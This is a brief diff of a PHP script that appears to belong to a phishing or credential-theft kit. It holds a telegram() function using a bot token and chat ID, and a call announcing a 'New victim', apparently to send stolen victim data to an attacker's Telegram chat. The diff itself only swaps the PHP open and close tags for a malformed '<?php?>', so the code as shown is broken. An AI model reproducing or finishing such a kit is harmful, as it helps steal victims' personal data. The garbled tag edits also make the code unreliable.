@@ -1,4 +1,4 @@
-<?php
+<?php?>
 
 function telegram($msg) {
         global $telegrambot,$telegramchatid;
@@ -39,4 +39,4 @@ telegram("New victim:
 
 <source>
 
-?>
+<?php?>
